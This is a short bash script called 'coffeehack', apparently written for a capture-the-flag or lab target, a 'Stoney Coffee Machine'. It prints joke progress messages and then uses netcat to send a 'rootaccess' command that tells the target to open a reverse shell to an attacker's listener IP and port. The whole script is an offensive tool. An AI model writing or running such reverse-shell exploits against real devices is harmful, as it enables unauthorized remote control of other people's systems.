#!/bin/bash

# Check if all arguments are provided
if [ "$#" -ne 4 ]; then
    echo "Usage: ./coffeehack <Coffee Machine IP> <Coffee Machine Port> <Listener IP> <Listener Port>"
    exit 1
fi

COFFEE_MACHINE_IP=$1
COFFEE_MACHINE_PORT=$2
LISTENER_IP=$3
LISTENER_PORT=$4

# Funny messages for the hacking process
echo "Initializing hack on the Stoney Coffee Machine at $COFFEE_MACHINE_IP..."
sleep 1

echo "Bypassing Stoney security protocols..."
sleep 2

echo "Injecting malicious coffee beans into $COFFEE_MACHINE_IP..."
sleep 2

echo "Extraction of root privileges in progress..."
sleep 2

# Connect to the Coffee Machine and send the rootaccess command with reverse shell IP and port
echo "[*] Connecting to the Coffee Machine at $COFFEE_MACHINE_IP on port $COFFEE_MACHINE_PORT..."
sleep 1

# Use netcat to send the rootaccess command with the listener IP and port for reverse shell
echo "[*] Exploiting... Sending reverse shell request"
(echo "rootaccess $LISTENER_IP $LISTENER_PORT"; sleep 1) | nc $COFFEE_MACHINE_IP $COFFEE_MACHINE_PORT

echo "[*] Exploit completed. Check your listener for the reverse shell."
